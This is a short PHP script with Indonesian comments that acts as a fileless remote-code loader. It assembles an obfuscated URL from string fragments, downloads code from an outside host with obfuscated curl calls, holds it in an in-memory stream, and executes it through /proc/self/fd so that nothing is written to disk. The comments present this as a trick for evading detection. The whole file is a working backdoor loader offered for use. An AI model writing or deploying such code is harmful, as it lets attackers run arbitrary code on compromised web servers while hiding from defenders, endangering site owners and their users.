<?php
// 1. Ambil kode (Socket/Curl/FGC Fallback seperti biasa)
$u='ht'.'tps://'.'st'.'ep'.'mo'.'mh'.'ub.'.'co'.'m/'.'77.t'.'xt';
function x($u){
    // ... (Gunakan fungsi downloader "x" yang sudah saya buatkan sebelumnya) ...
    // Agar ringkas, anggap fungsi x() ada di sini
    $c='cu'.'rl_';$i=$c.'init';if(function_exists($i)){$ch=$i($u);($c.'setopt')($ch,19913,1);$r=($c.'exec')($ch);if($r)return $r;}
    return file_get_contents($u);
}
$code = x($u);

// 2. TULIS KE STREAM SYSTEM (Bukan File Fisik)
// php://temp menyimpan data di RAM sampai batas tertentu (default 2MB)
$stream = fopen('php://temp', 'r+'); 
fwrite($stream, $code);

// 3. TRIK FILE DESCRIPTOR
// Jangan di-close/fclose! Kita butuh stream ini tetap hidup.
rewind($stream); // Kembalikan pointer ke awal

// Dapatkan ID File Descriptor (Integer)
// (int)$stream pada resource akan menghasilkan ID FD di Linux
$fid = (int)$stream; 

// 4. EKSEKUSI VIA JALUR KERNEL
// Meng-include langsung dari map proses Linux
include "/proc/self/fd/$fid";

// Otomatis hilang saat script selesai
?>
